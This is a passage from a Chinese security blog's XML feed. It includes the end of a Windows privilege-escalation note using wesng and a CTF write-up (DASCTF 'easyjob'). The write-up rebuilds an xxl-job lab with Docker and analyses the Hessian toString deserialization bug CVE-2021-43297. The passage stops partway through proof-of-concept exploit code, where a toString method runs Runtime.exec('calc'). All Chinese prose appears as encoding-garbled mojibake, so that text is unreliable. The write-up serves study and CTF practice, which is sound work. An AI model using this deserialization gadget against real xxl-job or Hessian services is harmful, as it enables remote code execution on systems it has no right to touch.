src="https://cdn.clown2024.cn/image-20241121172048305.png" alt="image-20241121172048305"></p><p>è¿™å°é¶æœºæ¯”å‰é¢çš„ç®€å•æŒºå¤šçš„</p><p>å…¶å®åº”è¯¥win7é¶æœºç”¨æ™®é€šç”¨æˆ·ç™»å½•æ‰å¯¹ï¼Œè¿™æ ·æˆ‘ä»¬æ‰éœ€è¦ææƒ</p><p>æŸ¥æ‰¾ææƒæ¼æ´çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨systeminfoä¿å­˜ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œç„¶åç”¨wesngå·¥å…·æ¥æœç´¢</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python wes.py sysinfo.txt --impact <span class="hljs-string">&quot;Elevation of Privilege&quot;</span><br><span class="hljs-comment">#--impactæŒ‡å®šæ¼æ´ç±»å‹ä¸ºææƒæ¼æ´</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121183215773.png" alt="image-20241121183215773"></p><p>ç„¶åå°±å¯ä»¥æ‰¾åˆ°å„ç§æ¼æ´ä¿¡æ¯äº†</p><p>expæ¼æ´åº“ï¼š<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;è™šæ‹Ÿæœºå¯†ç &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win7&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sun</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DASCtf-easyjob</title>
    <link href="https://clowsman.github.io/2024/11/18/DASCtf-easyjob/"/>
    <id>https://clowsman.github.io/2024/11/18/DASCtf-easyjob/</id>
    <published>2024-11-18T11:57:35.000Z</published>
    <updated>2024-11-28T10:34:00.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç”±äºé¢˜ç›®æ˜¯å…¬å…±é¶æœºç°åœ¨å·²ç»æŒ‚äº†ï¼Œæ‰€ä»¥å¤ç°éœ€è¦è‡ªå·±æ­å»ºé¢˜ç›®ç¯å¢ƒ</p><p>è·Ÿç€è¿™ç¯‡æ–‡ç« æ¥é…ç½®ä¸€ä¸‹ï¼š<a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p>ä¸»è¦æ˜¯adminç»„ä»¶çš„é…ç½®ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªwarï¼Œéœ€è¦éƒ¨ç½²åœ¨tomcatä¸Šï¼Œexecutoræ˜¯springbootåº”ç”¨ï¼Œç›´æ¥java -jarå°±è¡Œäº†</p><p><strong>mysqlé…ç½®</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯åŠ¨æ•°æ®åº“</span><br>docker run -itd --name xxl-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.6.40<br><span class="hljs-comment"># å¤åˆ¶sqlåˆ°å®¹å™¨ä¸­</span><br>docker <span class="hljs-built_in">cp</span> &lt;xxl-jobçš„sqlæ–‡ä»¶&gt; xxl-mysql:/tmp<br><span class="hljs-comment"># è¿›å…¥å®¹å™¨è¿æ¥æ•°æ®åº“</span><br>mysql -uroot -p123456<br><span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤å¯¼å…¥æ•°æ®åº“</span><br><span class="hljs-built_in">source</span> /tmp/tables_xxl_job.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119102349324.png" alt="image-20241119102349324"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘ä¸€ä¸‹xxl-jobçš„adminé¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦ä»–waråŒ…è§£å‹åçš„æ–‡ä»¶å¤¹ï¼Œé…ç½®æ–‡ä»¶éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œxxl.job.db.passwordå±æ€§æ”¹æˆåˆšåˆšçš„æ•°æ®åº“çš„å¯†ç </p><p>ç„¶åå†™ä¸€ä¸ªdockerfileæ„å»ºtomcatæœåŠ¡</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br></code></pre></td></tr></table></figure><p>æ„å»ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build -t xxl-admin:0.1 .<br></code></pre></td></tr></table></figure><p>å¯åŠ¨é•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -itd --name xxl-admin -p 8080:8080 xxl-admin:0.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119105306668.png" alt="image-20241119105306668"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘xxl-job-executor-sample-springbootæ‰§è¡Œå™¨ï¼Œè¿™ä¸ªå’Œé¢˜ç›®çš„æ˜¯ä¸€æ ·çš„ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„xxl.job.admin.addressesä¸º<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p><p>ç„¶åç›´æ¥java -jarå°±èƒ½è·‘èµ·æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105551883.png" alt="image-20241119105551883"></p><p>æˆ‘ä»¬çš„æ‰§è¡Œå™¨ä¹Ÿä¸Šçº¿äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105718265.png" alt="image-20241119105718265"></p><h2 id="docker-composeæ­å»º"><a href="#docker-composeæ­å»º" class="headerlink" title="docker-composeæ­å»º"></a>docker-composeæ­å»º</h2><p>æƒ³è‡ªå·±è¯•è¯•docker-composeæ­å»ºï¼Œæ²¡æœ‰æ€ä¹ˆæ­å»ºè¿‡å¤šå®¹å™¨çš„åº”ç”¨ï¼Œä½†æ˜¯æµªè´¹äº†å¥½å¤šæ—¶é—´å•Šå®åœ¨æ˜¯ï¼Œå¤ªæŠ˜ç£¨äº†</p><p>å…ˆç»™ä¸€ä¸ªæ€»çš„docker-compose.yaml</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">admin:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./admin</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">executor:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./executor</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">executor</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9999:9999&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3306:3306&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>    <span class="hljs-attr">command:</span> <span class="hljs-string">--default-authentication-plugin=mysql_native_password</span> <span class="hljs-comment">#è§£å†³å¤–éƒ¨æ— æ³•è®¿é—®</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">xxl-job-network:</span><br></code></pre></td></tr></table></figure><p><strong>å¯åŠ¨mysqlçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/mysql:<span class="hljs-number">5.7</span><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œè®¾ç½® MySQL çš„ root å¯†ç </span><br><span class="hljs-keyword">ENV</span> MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /tmp ç›®å½•</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./tables_xxl_job.sql /tmp/</span><br><span class="hljs-comment"># å¤åˆ¶åˆ°docker-entrypoint-initdb.dä¸­</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /tmp/*.sql /docker-entrypoint-initdb.d</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /docker-entrypoint-initdb.d ç›®å½•ï¼ŒMySQL å®˜æ–¹é•œåƒçš„ä¸€ä¸ªç‰¹æ€§ï¼šä»»ä½•æ”¾åœ¨ /docker-entrypoint-initdb.d/ ç›®å½•ä¸‹çš„ .sql æ–‡ä»¶éƒ½ä¼šåœ¨ MySQL æœåŠ¡å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</span><br><br><span class="hljs-keyword">ENV</span> LANG=C.UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘æƒ³ç€å‚è€ƒvulhubé‡Œçš„2.2ç‰ˆæœ¬çš„xxl-jobç¯å¢ƒæ¥è¿›è¡Œæ­å»ºï¼Œä½†æ˜¯åœ¨mavenç¼–è¯‘çš„æ—¶å€™æ€»ä¼šå‡ºé”™ï¼Œæˆ‘åªèƒ½é‡‡å–æœ¬åœ°å…ˆç¼–è¯‘ç„¶åå†å°†jaråŒ…ä¹‹ç±»çš„ç›´æ¥æ”¾å…¥</p><p><strong>adminçš„dockerfile</strong></p><p>ç¼–è¯‘å¥½ä¹‹åå°†è§£å‹çš„waråŒ…ç›®å½•æ”¾åœ¨dockerfileçš„ä¸Šä¸‹æ–‡ç›®å½•ä¸­</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å‰éœ€è¦æ”¹ä¸€ä¸‹é…ç½®ï¼Œæˆ‘ä»¬è¿æ¥æ•°æ®åº“é‡‡ç”¨æœåŠ¡åçš„æ–¹å¼åœ¨docker-composeä¸­ï¼Œxxl.job.db.urlæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.db.url</span>=<span class="hljs-string">jdbc:mysql://db:3306/xxl-job?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªå‘ï¼Œåœ¨mysql5.7ä»¥ä¸Šè¿æ¥æ•°æ®åº“æ˜¯éœ€è¦é…ç½®useSSL&#x3D;falseæˆ–è€…trueè¿™ä¸ªé€‰é¡¹çš„ï¼Œä¸ç„¶è¿æ¥çš„æ—¶å€™ä¼šä¸€ç›´bad handshakeï¼Œè¢«å‘äº†å¥½ä¹…åœ¨è¿™é‡ŒğŸ˜­</p></blockquote><p><strong>æœ€åæ˜¯executorçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>u272-jre<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;clown&quot;</span></span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-executor-sample-springboot-1.9.2.jar /usr/src/xxl-job-executor-sample-springboot-1.9.2.jar</span><br><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /usr/src</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/usr/src/xxl-job-executor-sample-springboot-1.9.2.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯å…ˆç¼–è¯‘å¥½ç„¶åæ”¾åˆ°dockerfileçš„ä¸Šä¸‹æ–‡ä¸­</p><p>åŒæ ·éœ€è¦ä¿®æ”¹ä¸€ä¸‹é…ç½®ï¼Œå°†xxl.job.admin.addressesæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.admin.addresses</span>=<span class="hljs-string">http://admin:8080/</span><br></code></pre></td></tr></table></figure><p>æˆ‘çš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241119152118108.png" alt="image-20241119152118108"></p><p>é‡Œé¢æ··æ‚ç€ä¸€äº›æ²¡ç”¨çš„æ–‡ä»¶é—®é¢˜ä¸å¤§ï¼Œéƒ½æ˜¯å¤±è´¥çš„è¯•éªŒå“ğŸ˜­</p><p>æœ€å</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119152217714.png" alt="image-20241119152217714"></p><p><img src="https://cdn.clown2024.cn/image-20241119152237897.png" alt="image-20241119152237897"></p><p>æˆåŠŸå¯åŠ¨ï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/PeterJXL/p/18415349">https://www.cnblogs.com/PeterJXL/p/18415349</a></p><p><a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p><a href="https://blog.csdn.net/lichaohao_10/article/details/127445796">https://blog.csdn.net/lichaohao_10/article/details/127445796</a></p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>å› ä¸ºè¿™é¢˜æ¶‰åŠåˆ°äº†HessianåŸç”Ÿååºåˆ—åŒ–ï¼Œåˆšå¥½è¿˜æœ‰ä¸€ç§æ–¹å¼æ²¡çœ‹ï¼Œè¿™é‡Œå°±é¡ºä¾¿ç®€å•å­¦ä¹ ä¸€ä¸‹</p><h2 id="hessiançš„tostingå¼‚å¸¸ååºåˆ—åŒ–"><a href="#Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–" class="headerlink" title="Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–"></a>Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–</h2><p>åŸç†æ˜¯å­—ç¬¦ä¸²å’Œå¯¹è±¡æ‹¼æ¥å¯¼è‡´éšå¼è§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•ï¼Œè¯¥æ¼æ´æœ‰ä¸€ä¸ªcveï¼ŒCVE-2021-43297</p><p>è¿™ä¸ªCVEé’ˆå¯¹çš„æ˜¯Hessian2Input#expectï¼ŒHessian1åˆ™æ²¡æœ‰å¯¹åº”çš„é—®é¢˜ã€‚</p><h3 id="åˆ©ç”¨å…³é”®"><a href="#åˆ©ç”¨å…³é”®" class="headerlink" title="åˆ©ç”¨å…³é”®"></a>åˆ©ç”¨å…³é”®</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹expectçš„å†™æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> IOException <span class="hljs-title function_">expect</span><span class="hljs-params">(String expect, <span class="hljs-type">int</span> ch)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>  &#123;<br>    <span class="hljs-keyword">if</span> (ch &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect + <span class="hljs-string">&quot; at end of file&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123;<br>      _offset--;<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> _offset;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span><br>          <span class="hljs-operator">=</span> buildDebugContext(_buffer, <span class="hljs-number">0</span>, _length, offset);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> readObject();<br><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>)<br>                       + <span class="hljs-string">&quot; &quot;</span> + obj.getClass().getName() + <span class="hljs-string">&quot; (&quot;</span> + obj + <span class="hljs-string">&quot;)&quot;</span><br>                       + <span class="hljs-string">&quot;\n  &quot;</span> + context + <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-string">&quot; null&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        log.log(Level.FINE, e.toString(), e);<br><br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                     + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>));<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ¥å—äº†ä¸€ä¸ªexpectçš„Stringç±»å‹å˜é‡ï¼Œç„¶åè°ƒç”¨readObjectæ–¹æ³•è·å–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œå†ç›´æ¥å°†expectå’Œobjå¯¹è±¡æ‹¼æ¥èµ·æ¥ï¼Œä»è€Œè§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å»æ‰¾ä¸€ä¸‹expectæ–¹æ³•çš„å¼•ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241126230631856.png" alt="image-20241126230631856"></p><p>å¯ä»¥æ‰¾åˆ°å¤§éƒ¨åˆ†çš„readæ–¹æ³•éƒ½å¯ä»¥è°ƒç”¨expectæ–¹æ³•ï¼Œæ–‡ç« é€‰æ‹©çš„æ˜¯readStringï¼Œé‚£è¿™é‡Œä¹Ÿè·Ÿç€readStringæ¥</p><p>ç„¶åä¹Ÿæ˜¯é€šè¿‡æŸ¥æ‰¾å¼•ç”¨çš„æ–¹å¼æ‰¾readStringçš„è°ƒç”¨ï¼Œè¿™é‡Œå¼•ç”¨readStringçš„æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œæ‰€ä»¥é¢å‘ç»“æœæŸ¥æ‰¾ï¼ˆ</p><p>å®Œæ•´çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Hessian2Input#readObject --&gt; Hessian2Input#readObjectDefinition --&gt; Hessian2Input#readString --&gt; Hessian2Input#expect<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯åˆ†æè§¦å‘çš„ç‚¹</p><p>é¦–å…ˆæ˜¯readObjectæ–¹æ³•ä¸­ï¼Œä»–ä¼šè¯»å–ç¬¬ä¸€ä¸ªå­—èŠ‚æ•°æ®æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126231943276.png" alt="image-20241126231943276"></p><p>ç„¶åå¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå¤§å†™Cå³byteä¸º67çš„è¯ï¼Œå°±ä¼šè°ƒç”¨readObjectDefinitionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232117755.png" alt="image-20241126232117755"></p><p>ç„¶åé‡Œé¢å°±ä¼šè°ƒç”¨readStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232145954.png" alt="image-20241126232145954"></p><p>ç„¶åreadStringä¹Ÿæ˜¯è¯»å–å­—èŠ‚æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126232608979.png" alt="image-20241126232608979"></p><p>ä½†æ˜¯æˆ‘ä»¬å†™å…¥çš„æ˜¯å¯¹è±¡ç±»å‹ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨è€ƒè™‘ä»–è¯»å–çš„ç¬¬äºŒä¸ªtagï¼Œæœ€ç»ˆä¸€å®šä¼šèµ°åˆ°defaulté‡Œé¢è§¦å‘expect</p><p><img src="https://cdn.clown2024.cn/image-20241126232816146.png" alt="image-20241126232816146"></p><h3 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h3><p>é‚£ç°åœ¨æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•æ§åˆ¶ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥ä½¿ç”¨<strong>System.arraycopy</strong>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯javaä¸­ç”¨æ¥å¤åˆ¶æ•°ç»„å…ƒç´ çš„æ–¹æ³•</p><p>å†™ä¸€ä¸ªPersonç±»é‡Œé¢çš„toStringæ–¹æ³•æœ‰æ¶æ„ä»£ç æ¥ç®€å•æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">expectExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 